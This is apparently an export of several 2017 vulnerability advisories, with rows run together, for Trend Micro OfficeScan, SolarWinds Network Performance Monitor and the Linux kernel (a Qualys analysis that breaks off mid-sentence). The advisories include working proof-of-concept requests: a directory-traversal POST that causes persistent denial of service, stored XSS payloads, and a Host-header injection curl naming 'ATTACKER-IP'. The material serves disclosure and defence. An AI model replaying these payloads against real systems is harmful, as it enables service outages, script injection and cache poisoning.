[root@localhost /]# curl -v -k https://VICTIM-IP:4343/officescan/CGI/cgiRqUpd.exe
* About to connect() to VICTIM-IP port 4343
* Trying VICTIM-IP.. connected
<HTTP/1.1 200 OK
< Pragma: no-cache
< Content-Type: text/plain;charset=iso-8859-1
< Server: Microsoft-IIS/7.5
< X-Powered-By: ASP.NET
< Date: Fri, 02 Jun 2017 18:00:36 GMT
< Connection: close
< Content-Length: 22
[INI_UPDATE_SECTION]
BOOOM!
Network Access:
===============
Remote
Severity:
=========
High
Disclosure Timeline:
=============================
Vendor Notification: June 2, 2017
Vendor releases fixes / advisory : September 27, 2017
September 28, 2017 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
1611,[CVE-2017-9538] Persistent Application Denial of Service,,CVE-2017-9538,"-------------------------------------------------------------
Vulnerability type: Persistent Application Denial of Service
-------------------------------------------------------------
Credit: Andy Tan
CVE ID: CVE-2017-9538
-----------------------------------------------
Product: SolarWinds Network Performance Monitor
-----------------------------------------------
Affected version: SolarWinds Network Performance Monitor version 12.0.15300.90 and possibly earlier
Hotfix: SolarWinds Orion Platform 2017.3 Hotfix 1
Description: An attacker has to inject an arbitrary payload e.g. ../../../boot.ini into the vulnerable field. After successful submission, the entire web application will encounter an error message displaying 'Unexpected Website Error, Cannot use a leading .. to exit above the top directory'. In other words, the denial of service is caused by an incorrect implementation of a directory-traversal protection mechanism. Restarting the service and the entire server itself does not resolve this issue.
Affected URL: https://<ip>/Orion/Admin/Settings.aspx
Navigation: Settings -> Web Console Settings -> Site Logo -> Upload logo from external path
Affected parameter: ctl00$ctl00$ctl00$BodyContent$ContentPlaceHolder1$adminContentPlaceholder$logoPath
================
Proof of Concept
================
POST /Orion/Admin/Settings.aspx HTTP/1.1
<Fill up rest of the headers>
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""__AntiXsrfTokenInput""
b752b8b9beec4c46ab90559cfcd2bc01
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""ctl00_ctl00_ctl00_BodyContent_ContentPlaceHolder1_adminContentPlaceholder_fileUploadImage_ClientState""
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""__EVENTTARGET""
ctl00$ctl00$ctl00$BodyContent$ContentPlaceHolder1$adminContentPlaceholder$imgbtnSubmit
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""__EVENTARGUMENT""
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""ctl00_ctl00_ctl00_BodyContent_ContentPlaceHolder1_adminContentPlaceholder_fileUploadImageNoc_ClientState""
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""__VIEWSTATE""
/wEPDwUJNzUxMTg4OTYyDxYCHhNWYWxpZGF0ZVJlcXVlc3RNb2RlAgEWAmYPZBYCZg9kFgJmDw8WBB4PX19BbnRpWHNyZlRva2VuBSBiNzUyYjhiOWJlZWM0YzQ2YWI5MDU1OWNmY2QyYmMwMR4SX19BbnRpWHNyZlVzZXJOYW1lBQZhZG1pbjFkFgICBA9kFgICAQ9kFgICBA8WBB4FY2xhc3MFDnN3LWFwcC1yZWdpb24gHgdlbmN0eXBlBRNtdWx0aXBhcnQvZm9ybS1kYXRhFgICBQ9kFgICAQ9kFjYCAg8PFgQeCENzc0NsYXNzBRYgc3ctYnRuLXByaW1hcnkgc3ctYnRuHgRfIVNCAgIWAh4KYXV0b21hdGlvbgUWRG93bmxvYWQgaW5zdGFsbGVyIG5vd2QCBBAPFgQfBQUTc3ctdmFsaWRhdGlvbi1lcnJvch8GAgJkZGQCBRAPFgQfBQUTc3ctdmFsaWRhdGlvbi1lcnJvch8GAgJkZGQCBhAPFgQfBQUTc3ctdmFsaWRhdGlvbi1lcnJvch8GAgJkZGQCCRAPFgQfBQUTc3ctdmFsaWRhdGlvbi1lcnJvch8GAgJkZGQCChAPFgQfBQUTc3ctdmFsaWRhdGlvbi1lcnJvch8GAgJkZGQCDA8WAh4Fc3R5bGUFDmRpc3BsYXk6YmxvY2s7FgYCAQ9kFgICAQ9kFgJmDxYEHgJpZAVfY3RsMDBfY3RsMDBfY3RsMDBfQm9keUNvbnRlbnRfQ29udGVudFBsYWNlSG9sZGVyMV9hZG1pbkNvbnRlbnRQbGFjZWhvbGRlcl9maWxlVXBsb2FkSW1hZ2VfY3RsMDIfCAUMd2lkdGg6MzU1cHg7ZAICDw8WBB8FBSN4LWZvcm0tZmlsZS1idG4gc3ctYnRuLXNtYWxsIHN3LWJ0bh8GAgIWAh8HBQZCcm93c2VkAgQQDxYEHwUFE3N3LXZhbGlkYXRpb24tZXJyb3IfBgICZGRkAg4PFgIfCAUOZGlzcGxheTpibG9jazsWAgIFEA8WBB8FBRNzdy12YWxpZGF0aW9uLWVycm9yHwYCAmRkZAIQDxYCHwgFDmRpc3BsYXk6YmxvY2s7FgYCAQ9kFgICAQ9kFgJmDxYEHwkFYmN0bDAwX2N0bDAwX2N0bDAwX0JvZHlDb250ZW50X0NvbnRlbnRQbGFjZUhvbGRlcjFfYWRtaW5Db250ZW50UGxhY2Vob2xkZXJfZmlsZVVwbG9hZEltYWdlTm9jX2N0bDAyHwgFDHdpZHRoOjM1NXB4O2QCAg8PFgQfBQUjeC1mb3JtLWZpbGUtYnRuIHN3LWJ0bi1zbWFsbCBzdy1idG4fBgICFgIfBwUGQnJvd3NlZAIEEA8WBB8FBRNzdy12YWxpZGF0aW9uLWVycm9yHwYCAmRkZAISDxYCHwgFDmRpc3BsYXk6YmxvY2s7FgICBRAPFgQfBQUTc3ctdmFsaWRhdGlvbi1lcnJvch8GAgJkZGQCFBAPFgQfBQUTc3ctdmFsaWRhdGlvbi1lcnJvch8GAgJkZGQCFhAPFgQfBQUTc3ctdmFsaWRhdGlvbi1lcnJvch8GAgJkZGQCGA8QZBAVAxFTaG93IFdvcnN0IFN0YXR1cyNTaG93IFdvcnN0IFN0YXR1cyAoSW50ZXJmYWNlcyBvbmx5KRVTaG93IG9ubHkgSUNNUCBTdGF0dXMVAwEqFE9yaW9uLk5QTS5JbnRlcmZhY2VzABQrAwNnZ2dkZAIZDxYCHgRUZXh0Bb4BV2hlbiBzaG93aW5nIHRoZSBzdGF0dXMgb2YgYW55IHNpbmdsZSBub2RlIG9uIHRoZSBub2RlIHRyZWUgb3Igb24gYSBtYXAsPGJyIC8+eW91IGNhbiBzaG93IHRoZSBzdGF0dXMgb2YgdGhlIG5vZGUgYW5kIGl0cyBjaGlsZHJlbiwgbm9kZSBzdGF0dXMgYW5kIGludGVyZmFjZXMsPGJyIC8+b3IganVzdCBub2RlIElDTVAgc3RhdHVzLmQ!
CHA8WAh8
KBVJQcm92aWRlIGlubGluZSBoaW50cyBmb3IgaW50ZWdyYXRpbmcgeW91ciBjdXJyZW50bHkgaW5zdGFsbGVkIFNvbGFyV2luZHMgcHJvZHVjdHMuZAIgEA8WBB8FBRNzdy12YWxpZGF0aW9uLWVycm9yHwYCAmRkZAIhEA8WBB8FBRNzdy12YWxpZGF0aW9uLWVycm9yHwYCAmRkZAIjEA8WBB8FBRNzdy12YWxpZGF0aW9uLWVycm9yHwYCAmRkZAIkEA8WBB8FBRNzdy12YWxpZGF0aW9uLWVycm9yHwYCAmRkZAImEA8WBB8FBRNzdy12YWxpZGF0aW9uLWVycm9yHwYCAmRkZAInEA8WBB8FBRNzdy12YWxpZGF0aW9uLWVycm9yHwYCAmRkZAIpEA8WBB8FBRNzdy12YWxpZGF0aW9uLWVycm9yHwYCAmRkZAIqEA8WBB8FBRNzdy12YWxpZGF0aW9uLWVycm9yHwYCAmRkZAIrEA8WBB8FBRNzdy12YWxpZGF0aW9uLWVycm9yHwYCAmRkZAIxEA8WBB8FBRNzdy12YWxpZGF0aW9uLWVycm9yHwYCAmRkZAIyEA8WBB8FBRNzdy12YWxpZGF0aW9uLWVycm9yHwYCAmRkZAIzDw8WBh8KBQZTdWJtaXQfBQUWIHN3LWJ0bi1wcmltYXJ5IHN3LWJ0bh8GAgIWAh8HBQZTdWJtaXRkGAMFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYKBVBjdGwwMCRjdGwwMCRjdGwwMCRCb2R5Q29udGVudCRDb250ZW50UGxhY2VIb2xkZXIxJGFkbWluQ29udGVudFBsYWNlaG9sZGVyJGxvZ29DYgVZY3RsMDAkY3RsMDAkY3RsMDAkQm9keUNvbnRlbnQkQ29udGVudFBsYWNlSG9sZGVyMSRhZG1pbkNvbnRlbnRQbGFjZWhvbGRlciRmaWxlVXBsb2FkSW1hZ2UFV2N0bDAwJGN0bDAwJGN0bDAwJEJvZHlDb250ZW50JENvbnRlbnRQbGFjZUhvbGRlcjEkYWRtaW5Db250ZW50UGxhY2Vob2xkZXIkbG9nb0Zyb21VcmxDYgVTY3RsMDAkY3RsMDAkY3RsMDAkQm9keUNvbnRlbnQkQ29udGVudFBsYWNlSG9sZGVyMSRhZG1pbkNvbnRlbnRQbGFjZWhvbGRlciRub2NMb2dvQ2IFXGN0bDAwJGN0bDAwJGN0bDAwJEJvZHlDb250ZW50JENvbnRlbnRQbGFjZUhvbGRlcjEkYWRtaW5Db250ZW50UGxhY2Vob2xkZXIkZmlsZVVwbG9hZEltYWdlTm9jBVpjdGwwMCRjdGwwMCRjdGwwMCRCb2R5Q29udGVudCRDb250ZW50UGxhY2VIb2xkZXIxJGFkbWluQ29udGVudFBsYWNlaG9sZGVyJG5vY0xvZ29Gcm9tVXJsQ2IFWmN0bDAwJGN0bDAwJGN0bDAwJEJvZHlDb250ZW50JENvbnRlbnRQbGFjZUhvbGRlcjEkYWRtaW5Db250ZW50UGxhY2Vob2xkZXIkY2JBdWRpdGluZ1RyYWlscwViY3RsMDAkY3RsMDAkY3RsMDAkQm9keUNvbnRlbnQkQ29udGVudFBsYWNlSG9sZGVyMSRhZG1pbkNvbnRlbnRQbGFjZWhvbGRlciRjaGJTaG93RGF0YVBvaW50c09uTGluZXMFW2N0bDAwJGN0bDAwJGN0bDAwJEJvZHlDb250ZW50JENvbnRlbnRQbGFjZUhvbGRlcjEkYWRtaW5Db250ZW50UGxhY2Vob2xkZXIkY2JOb3RpZnlSZW1vdmFibGUFYGN0bDAwJGN0bDAwJGN0bDAwJEJvZHlDb250ZW50JENvbnRlbnRQbGFjZUhvbGRlcjEkYWRtaW5Db250ZW50UGxhY2Vob2xkZXIkY2JBdXRvbWF0aWNHZW9sb2NhdGlvbgUuY3RsMDAkY3RsMDAkY3RsMDAkQm9keUNvbnRlbnQkY3RsMD!
AkTG9naW
5WaWV3MQ8PZAIBZAUuY3RsMDAkY3RsMDAkY3RsMDAkQm9keUNvbnRlbnQkY3RsMDAkTG9naW5WaWV3Mg8PZAIBZBC54iMHZwWuUrSOCyy3YhYFyEN1
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""__VIEWSTATEGENERATOR""
8442CAB0
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""ctl00$ctl00$ctl00$BodyContent$ContentPlaceHolder1$adminContentPlaceholder$tbSessionTimeout""
25
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""ctl00$ctl00$ctl00$BodyContent$ContentPlaceHolder1$adminContentPlaceholder$ddlWindowsAccountLogin""
False
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""ctl00$ctl00$ctl00$BodyContent$ContentPlaceHolder1$adminContentPlaceholder$tbAutoRefresh""
5
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""ctl00$ctl00$ctl00$BodyContent$ContentPlaceHolder1$adminContentPlaceholder$logoCb""
on
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""ctl00$ctl00$ctl00$BodyContent$ContentPlaceHolder1$adminContentPlaceholder$fileUploadImage$ctl00""
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""ctl00$ctl00$ctl00$BodyContent$ContentPlaceHolder1$adminContentPlaceholder$fileUploadImage$ctl02""; filename=""""
Content-Type: application/octet-stream
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""ctl00$ctl00$ctl00$BodyContent$ContentPlaceHolder1$adminContentPlaceholder$logoFromUrlCb""
on
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""ctl00$ctl00$ctl00$BodyContent$ContentPlaceHolder1$adminContentPlaceholder$logoPath""
./../../boot.ini
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""ctl00$ctl00$ctl00$BodyContent$ContentPlaceHolder1$adminContentPlaceholder$nocLogoCb""
on
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""ctl00$ctl00$ctl00$BodyContent$ContentPlaceHolder1$adminContentPlaceholder$fileUploadImageNoc$ctl00""
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""ctl00$ctl00$ctl00$BodyContent$ContentPlaceHolder1$adminContentPlaceholder$fileUploadImageNoc$ctl02""; filename=""""
Content-Type: application/octet-stream
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""ctl00$ctl00$ctl00$BodyContent$ContentPlaceHolder1$adminContentPlaceholder$nocLogoPath""
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""ctl00$ctl00$ctl00$BodyContent$ContentPlaceHolder1$adminContentPlaceholder$tbSiteLoginText""
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""ctl00$ctl00$ctl00$BodyContent$ContentPlaceHolder1$adminContentPlaceholder$tbHelpServer""
http://www.SolarWinds.com
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""ctl00$ctl00$ctl00$BodyContent$ContentPlaceHolder1$adminContentPlaceholder$ddlRollupWorstStatus""
False
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""ctl00$ctl00$ctl00$BodyContent$ContentPlaceHolder1$adminContentPlaceholder$ddlNodeChildStatusParticipationRule""
*
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""ctl00$ctl00$ctl00$BodyContent$ContentPlaceHolder1$adminContentPlaceholder$ddlNodeChildStatusDisplayMode""
NoBlink
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""ctl00$ctl00$ctl00$BodyContent$ContentPlaceHolder1$adminContentPlaceholder$ddlTipsIntegration""
1
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""ctl00$ctl00$ctl00$BodyContent$ContentPlaceHolder1$adminContentPlaceholder$cbDragAndDropResources""
1
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""ctl00$ctl00$ctl00$BodyContent$ContentPlaceHolder1$adminContentPlaceholder$cbAuditingTrails""
on
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""ctl00$ctl00$ctl00$BodyContent$ContentPlaceHolder1$adminContentPlaceholder$tbChartAspect""
0.620000004768372
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""ctl00$ctl00$ctl00$BodyContent$ContentPlaceHolder1$adminContentPlaceholder$tbThumbnailAspect""
0.600000023841858
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""ctl00$ctl00$ctl00$BodyContent$ContentPlaceHolder1$adminContentPlaceholder$tbPercentile""
95
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""ctl00$ctl00$ctl00$BodyContent$ContentPlaceHolder1$adminContentPlaceholder$tbMaximumSeries""
10
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""ctl00$ctl00$ctl00$BodyContent$ContentPlaceHolder1$adminContentPlaceholder$chbShowDataPointsOnLines""
on
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""ctl00$ctl00$ctl00$BodyContent$ContentPlaceHolder1$adminContentPlaceholder$ddlFontSize""
1
-----------------------------180072296016649028841705926975
Content-Disposition: form-data; name=""ctl00$ctl00$ctl00$BodyContent$ContentPlaceHolder1$adminContentPlaceholder$tbAutoRefreshActiveAlerts""
1
-----------------------------180072296016649028841705926975--
------------------------
Vendor contact timeline:
------------------------
2017-06-12: Contacted vendor.
2017-06-23: Vendor responded that bug jury completed and vulnerability is assigned to vNext milestone.
2017-08-22: Contacted vendor again.
2017-08-23: Vendor responded that hotfix will be released for all products shipping on Orion Core 2017.3
2017-09-28: Contacted vendor again.
2017-09-28: Vendor responded that the vulnerability is addressed in the recently released Hotfix for Core 2017.3
2017-09-29: Public disclosure."
1612,[CVE-2017-9537] Persistent Cross-Site Scripting Vulnerabilities,,CVE-2017-9537,"-------------------------------------------------------------
Vulnerability type: Persistent Cross-Site Scripting
-------------------------------------------------------------
Credit: Andy Tan
CVE ID: CVE-2017-9537
-----------------------------------------------
Product: SolarWinds Network Performance Monitor
-----------------------------------------------
Affected version: SolarWinds Network Performance Monitor version 12.0.15300.90 and possibly earlier
Hotfix: SolarWinds Orion Platform 2017.3 Hotfix 1
1.
Affected URL: https://<ip>/Orion/Nodes/Add/Properties.aspx
Affected parameter: City, Comments, Department
Affected functions: Group Description field, Last_XX_Events resource, Events page, and error page
Navigation: (Settings -> Manage Nodes -> Add Node)
2.
Affected Source URL: https://<ip>/Orion/Services/WebAdmin.asmx/CreateExternalWebsite
Affected parameter: FullTitle
Affected URL: https://<ip>/Orion/External.aspx?Site=<no>
Navigation: (Settings -> All Settings -> External Websites)
================
Proof of Concept
================
1.
POST /Orion/Nodes/Add/Properties.aspx HTTP/1.1
<Fill up rest of the headers>
<Fill up rest of the parameters>ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24ctl06%24repCustomProperties%24ctl00%24PropertyValue%24TextBoxEditorValue=%3CIMG%20SRC%3D%20a%20onerror%3Dalert('testXSSCity')%3E&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24ctl06%24repCustomProperties%24ctl01%24PropertyValue%24TextBoxEditorValue=%3CIMG%20SRC%3D%20a%20onerror%3Dalert('testXSSComments')%3E&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24ctl06%24repCustomProperties%24ctl02%24PropertyValue%24TextBoxEditorValue=%3CIMG%20SRC%3D%20a%20onerror%3Dalert('testXSSDept')%3E
2.
POST /Orion/Services/WebAdmin.asmx/CreateExternalWebsite HTTP/1.1
<Fill up rest of the headers>
{""site"":{""ID"":0,""ShortTitle"":""title"",""FullTitle"":""</title><script>alert('DTPTXSS!')</script>"",""URL"":""url""},""menuBar"":""Default""}
------------------------
Vendor contact timeline:
------------------------
2017-06-12: Contacted vendor.
2017-06-23: Vendor responded that bug jury completed and vulnerability is assigned to vNext milestone.
2017-08-22: Contacted vendor again.
2017-08-23: Vendor responded that hotfix will be released for all products shipping on Orion Core 2017.3
2017-09-28: Contacted vendor again.
2017-09-28: Vendor responded that the vulnerability is addressed in the recently released Hotfix for Core 2017.3
2017-09-29: Public disclosure."
1614,CVE-2017-14087 Trend Micro OfficeScan v11.0 and XG (12.0)* Host Header Injection (apparitionsec / hyp3rlinx),,CVE-2017-14087,"[+] Credits: John Page (aka hyp3rlinx)
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/CVE-2017-14087-TRENDMICRO-OFFICESCAN-XG-HOST-HEADER-INJECTION.txt
[+] ISR: ApparitionSec
Vendor:
==================
www.trendmicro.com
Product:
========
OfficeScan
v11.0 and XG (12.0)*
OfficeScan protects enterprise networks from malware, network viruses, web-based threats, spyware, and mixed threat attacks.
An integrated solution, OfficeScan consists of the OfficeScan agent program that resides at the endpoint and a server program that
manages all agents. The OfficeScan agent guards the endpoint and reports its security status to the server. The server, through the
web-based management console, makes it easy to set coordinated security policies and deploy updates to every agent.
Vulnerability Type:
===================
Host Header Injection
CVE Reference:
==============
CVE-2017-14087
Security Issue:
================
Host header injection issue as ""db_controller.php"" relies on $_SERVER['HTTP_HOST'] which can be spoofed by client, instead of $_SERVER['SERVER_NAME'].
In environments where caching is in place by making HTTP GET request with a poisoned HOST header webpages can potentially render arbitrary
links that point to a malicious website.
Exploit/POC:
=============
c:> CURL http://x.x.x.x -H ""Host: ATTACKER-IP""
Network Access:
===============
Remote
Severity:
=========
Medium
Disclosure Timeline:
==================================
Vendor Notification: June 2, 2017
Vendor releases fixes / advisory : September 27, 2017
September 28, 2017 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
1615,CVE-2017-14084 Trend Micro OfficeScan v11.0 and XG (12.0)* CURL (MITM) Remote Code Execution (apparitionsec / hyp3rlinx),,CVE-2017-14084,"[+] Credits: John Page (aka hyp3rlinx)
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/CVE-2017-14084-TRENDMICRO-OFFICESCAN-XG-CURL-MITM-REMOTE-CODE-EXECUTION.txt
[+] ISR: ApparitionSec
Vendor:
==================
www.trendmicro.com
Product:
========
OfficeScan
v11.0 and XG (12.0)*
OfficeScan protects enterprise networks from malware, network viruses, web-based threats, spyware, and mixed threat attacks.
An integrated solution, OfficeScan consists of the OfficeScan agent program that resides at the endpoint and a server program that
manages all agents. The OfficeScan agent guards the endpoint and reports its security status to the server. The server, through the
web-based management console, makes it easy to set coordinated security policies and deploy updates to every agent.
Vulnerability Type:
===================
Man-in-the-Middle (MITM) Remote Code Execution
CVE Reference:
==============
CVE-2017-14084
Security Issue:
===============
MITM vector exists as the CURL request used by Send() function in ""HttpTalk.php"" has both CURLOPT_SSL_VERIFYPEER and CURLOPT_SSL_VERIFYHOST set to false.
CURLOPT_SSL_VERIFYPEER checks if remote certificate is valid and that you trust was issued by a CA you trust and it's genuine.
CURLOPT_SSL_VERIFYHOST checks that the cert was issued to the entity you want to talk to...
References:
===========
https://success.trendmicro.com/solution/1118372
Vulnerable code snippet...

curl_setopt($this->_objcurlHandle, CURLOPT_FOLLOWLOCATION,false);
curl_setopt($this->_objcurlHandle, CURLOPT_RETURNTRANSFER,true);
curl_setopt($this->_objcurlHandle, CURLOPT_HEADER, true);
curl_setopt($this->_objcurlHandle, CURLOPT_SSL_VERIFYHOST, 0); <=================== HERE
curl_setopt($this->_objcurlHandle, CURLOPT_SSL_VERIFYPEER, 0); <==================== THERE
Network Access:
===============
Remote
Severity:
=========
High
Disclosure Timeline:
=================================
Vendor Notification: May 31, 2017
Vendor releases fixes / advisory : September 27, 2017
September 28, 2017 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
1619,Qualys Security Advisory - Linux PIE/stack corruption (CVE-2017-1000253),,CVE-2017-1000253,"Qualys Security Advisory
Linux PIE/stack corruption (CVE-2017-1000253)
========================================================================
Contents
========================================================================
Summary
Analysis
Exploitation
Acknowledgments
========================================================================
Summary
========================================================================
Linux distributions that have not patched their long-term kernels with
https://git.kernel.org/linus/a87938b2e246b81b4fb713edb371a9fa3c5c3c86
(committed on April 14, 2015) are vulnerable to CVE-2017-1000253, a
Local Privilege Escalation.
Most notably, all versions of CentOS 7 before 1708 (released on
September 13, 2017), all versions of Red Hat Enterprise Linux 7 before
7.4 (released on August 1, 2017), and all versions of CentOS 6 and Red
Hat Enterprise Linux 6 are exploitable.
========================================================================
Analysis
========================================================================
------------------------------------------------------------------------
Pre-Stack-Clash kernels
------------------------------------------------------------------------
Occasionally, we have noticed a strange behavior with PIEs
(Position-Independent Executables) on CentOS 7:
Linux localhost.localdomain 3.10.0-514.21.1.el7.x86_64 #1 SMP Thu May 25 17:04:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
7ffbad3b3000-7ffbad56a000 r-xp 00000000 fd:00 9066 /usr/lib64/libc-2.17.so
7ffbad56a000-7ffbad769000 ---p 001b7000 fd:00 9066 /usr/lib64/libc-2.17.so
7ffbad769000-7ffbad76d000 r--p 001b6000 fd:00 9066 /usr/lib64/libc-2.17.so
7ffbad76d000-7ffbad76f000 rw-p 001ba000 fd:00 9066 /usr/lib64/libc-2.17.so
7ffbad76f000-7ffbad774000 rw-p 00000000 00:00 0
7ffbad774000-7ffbad794000 r-xp 00000000 fd:00 1229 /usr/lib64/ld-2.17.so
7ffbad967000-7ffbad98b000 rw-p 00000000 00:00 0
7ffbad990000-7ffbad991000 rw-p 00000000 00:00 0
7ffbad991000-7ffbad993000 r-xp 00000000 00:00 0 [vdso]
7ffbad993000-7ffbad994000 r--p 0001f000 fd:00 1229 /usr/lib64/ld-2.17.so
7ffbad994000-7ffbad995000 rw-p 00020000 fd:00 1229 /usr/lib64/ld-2.17.so
7ffbad995000-7ffbad996000 rw-p 00000000 00:00 0
7ffbad996000-7ffbad998000 r-xp 00000000 fd:00 4194375 /tmp/PIE
7ffbad999000-7ffbadb97000 rw-p 00000000 00:00 0 [stack]
7ffbadb97000-7ffbadb98000 r--p 00001000 fd:00 4194375 /tmp/PIE
7ffbadb98000-7ffbadbb9000 rw-p 00002000 fd:00 4194375 /tmp/PIE
7ffbadbba000-7ffc0d9ba000 rw-p 00000000 00:00 0 [heap]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall]
rsp 0x7ffbad9a0978
In this example, the kernel's execve() code erroneously mapped the PIE's
read-write segment into the stack memory region, thus corrupting and
dividing the stack into three parts:
- 7ffbad999000-7ffbadb97000, the lowest part of the stack, is where the
stack pointer (rsp) points to, after execve() returns to the userland;
- 7ffbadb97000-7ffbadbb9000, the middle part of the stack, was replaced
by the PIE's read-write segment (7ffbadb97000-7ffbadb98000 was later
mprotect()ed read-only by RELRO), and hence a write to this part of
the stack smashes the PIE's read-write segment, and vice versa;
- 7ffbadbba000-7ffc0d9ba000, the highest part of the stack, is
incorrectly displayed as the ""[heap]"" in /proc/pid/maps (because the
program brk() points there), but is correctly flagged as a stack in
/proc/pid/smaps (the ""gd"" flag, ""grows down"").
This kernel vulnerability was fixed in April 2015 by commit
a87938b2e246b81b4fb713edb371a9fa3c5c3c86 (backported to Linux 3.10.77 in
May 2015), but it was not recognized as a security threat. This fix was
therefore not backported to long-term distributions such as CentOS:
------------------------------------------------------------------------
From: Michael Davidson <md google com>
Date: Tue, 14 Apr 2015 15:47:38 -0700
Subject: fs/binfmt_elf.c: fix bug in loading of PIE binaries
With CONFIG_ARCH_BINFMT_ELF_RANDOMIZE_PIE enabled, and a normal top-down
address allocation strategy, load_elf_binary() will attempt to map a PIE
binary into an address range immediately below mm->mmap_base.
Unfortunately, load_elf_ binary() does not take account of the need to
allocate sufficient space for the entire binary which means that, while
the first PT_LOAD segment is mapped below mm->mmap_base, the subsequent
PT_LOAD segment(s) end up being mapped above mm->mmap_base into the are
that is supposed to be the ""gap"" between the stack and the binary.
Since the size of the ""gap"" on x86_64 is only guaranteed to be 128MB this
means that binaries with large data segments > 128MB can end up mapping
part of their data segment over their stack resulting in corruption of the
stack (and the data segment once the binary starts to run).
Any PIE binary with a data segment > 128MB is vulnerable to this although
address randomization means that the actual gap between the stack and the
end of the binary is normally greater than 128MB. The larger the data
segment of the binary the higher the probability of failure.
Fix this by calculating the total size of the binary in the same way as
load_elf_interp().
Signed-off-by: Michael Davidson <md google com>
Cc: Alexander Viro <viro zeniv linux org uk>
Cc: Jiri Kosina <jkosina suse cz>
Cc: Kees Cook <keescook chromium org>
Cc: <stable vger kernel org>
Signed-off-by: Andrew Morton <akpm linux-foundation org>
Signed-off-by: Linus Torvalds <torvalds linux-foundation org>
---
fs/binfmt_elf.c | 9 ++++++++-
1 file changed, 8 insertions(+), 1 deletion(-)
diff --git a/fs/binfmt_elf.c b/fs/binfmt_elf.c
index 995986b..d925f55 100644
--- a/fs/binfmt_elf.c
+++ b/fs/binfmt_elf.c
@@ -862,6 +862,7 @@ static int load_elf_binary(struct linux_binprm *bprm)
i < loc->elf_ex.e_phnum; i++, elf_ppnt++) {
int elf_prot = 0, elf_flags;
unsigned long k, vaddr;
+ unsigned long total_size = 0;
if (elf_ppnt->p_type != PT_LOAD)
continue;
@@ -924,10 +925,16 @@ static int load_elf_binary(struct linux_binprm *bprm)
#else
load_bias = ELF_PAGESTART(ELF_ET_DYN_BASE - vaddr);
#endif
+ total_size = total_mapping_size(elf_phdata,
+ loc->elf_ex.e_phnum);
+ if (!total_size) {
+ error = -EINVAL;
+ goto out_free_dentry;
+ }
}
error = elf_map(bprm->file, load_bias + vaddr, elf_ppnt,
- elf_prot, elf_flags, 0);
+ elf_prot, elf_flags, total_size);
if (BAD_ADDR(error)) {
retval = IS_ERR((void *)error) ?
PTR_ERR((void*)error) : -EINVAL;
------------------------------------------------------------------------
Unfortunately, this vulnerability is not limited to the PIEs whose
read-write segment is larger than 128MB. Indeed, 128MB is the minimum
distance between the mmap_base and the highest address of the stack, not
the lowest address of the stack (CVE-2017-1000379): consequently, and as
